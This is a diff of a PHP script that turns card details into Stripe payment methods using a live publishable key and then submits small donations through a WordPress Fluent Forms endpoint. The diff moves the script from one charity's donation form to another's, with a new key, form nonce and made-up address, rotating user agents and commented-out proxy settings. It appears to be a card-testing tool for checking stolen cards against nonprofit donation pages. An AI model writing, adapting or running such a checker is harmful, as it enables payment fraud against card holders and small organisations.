@@ -30,10 +30,10 @@ function payment($card,$ccNo,$month,$year,$cvv){
     'muid' => 'NA',
     'sid' => 'NA',
     'pasted_fields' => 'number',
-    'payment_user_agent' => 'stripe.js/d182db0e09; stripe-js-v3/d182db0e09; card-element',
-    'referrer' => 'https://intercleft.com',
+    'payment_user_agent' => 'stripe.js/93fe8dba76;+stripe-js-v3/93fe8dba76;+card-element',
+    'referrer' => 'https://www.eastsideparkwayscoalition.com/',
     'time_on_page' => 200441,
-    'key' => 'pk_live_51PDjGEP5kAwbuwOPuj64dn9iek2PH4ZFM3C3omqgCVfS8tg3CUxDJGUYWZBn1m1WWajVvx4whSiV2AjMGv4hZljt00BhJPZ5OH'
+    'key' => 'pk_live_51Or9GoHTj0GS6BMFF5n0J6RWTywSnKihJGHNqEgDCtja4t6Cgk5NWedhYEpjYDHhvvuB8ortgOAb6Q1pVq9a4gXh00ONrrOsHF'
 	);
 	$url = "https://api.stripe.com/v1/payment_methods";
 
@@ -50,6 +50,7 @@ function payment($card,$ccNo,$month,$year,$cvv){
 	// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
 	$response = curl_exec($ch);
 	if (curl_errno($ch)) {
+		die("cURL Error: " . curl_error($ch));
 	    return [
     		false,
     		"$card - Request Error On Payment \n"
@@ -73,7 +74,7 @@ function payment($card,$ccNo,$month,$year,$cvv){
 	}	
 }
 function donate($card,$paymentId,$name,$email){
-	$formData = "data=__fluent_form_embded_post_id%3D35%26_fluentform_3_fluentformnonce%3D47c854abe6%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3D$name%26names%255Blast_name%255D%3D$name%26email%3D$email%26payment_input%3DOther%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__entry_intermediate_hash%3D08b93d0e6692b308d59a803fdeeaa262%26__stripe_payment_method_id%3D$paymentId&action=fluentform_submit&form_id=3";
+	$formData = "data=__fluent_form_embded_post_id%3D1306%26_fluentform_9_fluentformnonce%3D0c34caea96%26_wp_http_referer%3D%252Fdonate-to-espc%252F%26names%255Bfirst_name%255D%3D$name%26names%255Blast_name%255D%3D$name%26email%3D$email%26address_1%255Baddress_line_1%255D%3D125%2520Klee%2520Lane%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNY%26address_1%255Bzip%255D%3D10080%26payment_input%3D%252420%26payment_method%3Dstripe%26checkbox%255B%255D%3D%26__stripe_payment_method_id%3D$paymentId&action=fluentform_submit&form_id=9";
 	$userAgents = [
 	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
 	    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
@@ -89,7 +90,7 @@ function donate($card,$paymentId,$name,$email){
 	// $PROXYSCRAPE_PORT = ;
 	// $PROXYSCRAPE_HOSTNAME = '';
 	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://intercleft.com/wp-admin/admin-ajax.php?t=1722765796568');
+	curl_setopt($ch, CURLOPT_URL, 'https://www.eastsideparkwayscoalition.com/wp-admin/admin-ajax.php?t=1721825471378');
 	curl_setopt($ch, CURLOPT_POST, true);
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $formData);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
